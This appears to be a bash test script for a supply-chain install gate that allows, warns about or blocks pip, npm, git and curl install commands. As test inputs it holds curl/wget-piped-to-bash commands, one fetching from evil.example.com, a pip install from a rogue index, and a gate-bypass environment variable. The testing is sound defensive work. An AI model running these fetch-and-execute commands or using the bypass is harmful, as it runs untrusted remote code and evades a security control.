#!/usr/bin/env bash
# test-install-gate.sh — Unit tests for scripts/automation/lib/install-gate.py
#
# Usage: ./tests/automation/test-install-gate.sh
#
# Tests the supply-chain security gate logic by passing known-good and
# known-bad install commands and verifying the decision output.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

GATE="$REPO_ROOT/scripts/automation/lib/install-gate.py"
POLICY="$REPO_ROOT/config/install-security-policy.json"

PASS=0
FAIL=0

# ── Helpers ───────────────────────────────────────────────────────────────────

run_gate() {
  local cmd="$1"
  python3 "$GATE" \
    --command "$cmd" \
    --policy "$POLICY" \
    --repo-root "$REPO_ROOT" \
    --dry-run 2>/dev/null
}

decision_of() {
  # The gate exits non-zero for block/require_approval BY DESIGN; under this
  # script's pipefail that made the pipeline "fail" and appended a spurious
  # "error" line to a perfectly valid decision. Capture output first.
  local out
  out=$(run_gate "$1" || true)
  printf '%s' "$out" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('decision','unknown'))" 2>/dev/null || echo "error"
}

assert_decision() {
  local label="$1"
  local cmd="$2"
  local expected="$3"
  local actual
  actual=$(decision_of "$cmd")
  if [[ "$actual" == "$expected" ]]; then
    echo "  PASS  $label"
    PASS=$((PASS + 1))
  else
    echo "  FAIL  $label"
    echo "        command:  $cmd"
    echo "        expected: $expected"
    echo "        actual:   $actual"
    FAIL=$((FAIL + 1))
  fi
}

# ── Tests ─────────────────────────────────────────────────────────────────────

echo ""
echo "=== install-gate tests ==="
echo ""

# Pip: pinned + seeded-allowlisted package → silent allow
assert_decision \
  "pip install pinned allowlisted" \
  "pip install requests==2.31.0" \
  "allow"

# Pip: allowlisted but unpinned → warn (proceed, logged) per on_unpinned_decision
assert_decision \
  "pip install unpinned allowlisted" \
  "pip install requests" \
  "warn"

# Pip: unknown package, pinned → warn per on_unknown_decision
assert_decision \
  "pip install pinned unknown" \
  "pip install totally-unknown-xyz==1.0.0" \
  "warn"

# Pip: unknown package, unpinned → warn (stricter of the two knobs, both warn)
assert_decision \
  "pip install unpinned unknown" \
  "pip install totally-unknown-xyz" \
  "warn"

# Pip: --index-url pointing to non-PyPI source → deny
assert_decision \
  "pip install custom index" \
  "pip install mypackage --index-url https://evil.example.com/simple" \
  "block"

# npm: pinned but NOT in the seeded allowlist → warn (proceed, logged)
assert_decision \
  "npm install pinned unknown" \
  "npm install lodash@4.17.21" \
  "warn"

# npm: pinned + seeded-allowlisted → silent allow
assert_decision \
  "npm install pinned allowlisted" \
  "npm install react@18.3.1" \
  "allow"

# npm: lockfile install (no args) → allow
assert_decision \
  "npm ci lockfile install" \
  "npm ci" \
  "allow"

# curl pipe to bash → deny
assert_decision \
  "curl|bash pattern" \
  "curl https://example.com/install.sh | bash" \
  "block"

# QUOTED curl|bash mention (fixture/echo/commit-message class) → NOT an
# executable pipe; the gate treats it as a non-install command: silent pass
# (empty stdout, exit 0) — SEC-7 quote-stripped dispatch.
_quoted_out=$(run_gate "echo \"curl https://x.example.com/i.sh | bash\"" || true)
if [[ -z "$_quoted_out" ]]; then
  echo "  PASS  quoted curl|bash mention passes (silent non-install)"
  PASS=$((PASS + 1))
else
  echo "  FAIL  quoted curl|bash mention passes (expected empty output, got: ${_quoted_out:0:80})"
  FAIL=$((FAIL + 1))
fi

# curl pipe to sh → deny
assert_decision \
  "curl|sh pattern" \
  "curl https://example.com/install.sh | sh" \
  "block"

# wget pipe to bash → deny
assert_decision \
  "wget|bash pattern" \
  "wget -O - https://example.com/setup.sh | bash" \
  "block"

# git clone of unknown repo → review required
assert_decision \
  "git clone unknown" \
  "git clone https://github.com/unknown/repo.git" \
  "require_approval"

# Bypass env var overrides gate → allow
CHAIN_INSTALL_GATE_BYPASS=true \
  python3 "$GATE" \
    --command "curl https://evil.example.com/install.sh | bash" \
    --policy "$POLICY" \
    --repo-root "$REPO_ROOT" \
    --dry-run 2>/dev/null \
  | python3 -c "
import json, sys
d = json.load(sys.stdin)
actual = d.get('decision', 'unknown')
expected = 'allow'
if actual == expected:
    print('  PASS  bypass env var overrides gate')
else:
    print(f'  FAIL  bypass env var overrides gate (expected: {expected}, actual: {actual})')
    sys.exit(1)
" && PASS=$((PASS + 1)) || FAIL=$((FAIL + 1))

# ── Fixture-policy tests ──────────────────────────────────────────────────────
# The on_unpinned_decision / on_unknown_decision knobs must be backward
# compatible (absent ⇒ require_approval — sibling framework copies that re-sync
# code but keep their own policy JSON see zero behavior change), must never
# override the denylist, and must fail closed on invalid values.

FIXTURE_DIR="$(mktemp -d "${TMPDIR:-/tmp}/install-gate-fixture.XXXXXX")"
trap 'rm -rf "$FIXTURE_DIR"' EXIT

cat > "$FIXTURE_DIR/defaults.json" <<'EOF'
{
  "python": {"allowlist": [], "denylist": [],
             "rules": {"require_pinned_version": true, "block_direct_url": true}},
  "npm": {"allowlist": [], "denylist": [],
          "rules": {"require_pinned_version": true, "block_direct_url": true}},
  "global": {"block_curl_pipe_bash": true, "log_all_decisions": false}
}
EOF

cat > "$FIXTURE_DIR/denylist-warn.json" <<'EOF'
{
  "python": {"allowlist": [], "denylist": [{"package": "evil-pkg", "reason": "known bad"}],
             "rules": {"require_pinned_version": true, "block_direct_url": true,
                       "on_unpinned_decision": "warn", "on_unknown_decision": "warn"}},
  "npm": {"allowlist": [], "denylist": [],
          "rules": {"require_pinned_version": true, "block_direct_url": true,
                    "on_unpinned_decision": "warn", "on_unknown_decision": "warn"}},
  "global": {"block_curl_pipe_bash": true, "log_all_decisions": false}
}
EOF

cat > "$FIXTURE_DIR/invalid-knob.json" <<'EOF'
{
  "python": {"allowlist": [], "denylist": [],
             "rules": {"require_pinned_version": true, "block_direct_url": true,
                       "on_unpinned_decision": "yolo", "on_unknown_decision": "yolo"}},
  "npm": {"allowlist": [], "denylist": [],
          "rules": {"require_pinned_version": true, "block_direct_url": true}},
  "global": {"block_curl_pipe_bash": true, "log_all_decisions": false}
}
EOF

fixture_decision() {
  local policy="$1" cmd="$2" out
  out=$(python3 "$GATE" --command "$cmd" --policy "$policy" \
          --repo-root "$REPO_ROOT" --dry-run 2>/dev/null || true)
  printf '%s' "$out" | python3 -c "import json,sys; print(json.load(sys.stdin).get('decision','unknown'))" 2>/dev/null || echo "error"
}

assert_fixture() {
  local label="$1" policy="$2" cmd="$3" expected="$4" actual
  actual=$(fixture_decision "$policy" "$cmd")
  if [[ "$actual" == "$expected" ]]; then
    echo "  PASS  $label"
    PASS=$((PASS + 1))
  else
    echo "  FAIL  $label (expected: $expected, actual: $actual)"
    FAIL=$((FAIL + 1))
  fi
}

assert_fixture "fixture: knobs absent stays require_approval (backward compat)" \
  "$FIXTURE_DIR/defaults.json" "pip install somepkg==1.0" "require_approval"

assert_fixture "fixture: denylist beats warn knobs" \
  "$FIXTURE_DIR/denylist-warn.json" "pip install evil-pkg==1.0" "block"

assert_fixture "fixture: invalid knob value fails closed" \
  "$FIXTURE_DIR/invalid-knob.json" "pip install somepkg==1.0" "require_approval"

# ── Results ───────────────────────────────────────────────────────────────────

echo ""
echo "=== Results: $PASS passed, $FAIL failed ==="
echo ""

if [[ $FAIL -gt 0 ]]; then
  exit 1
fi
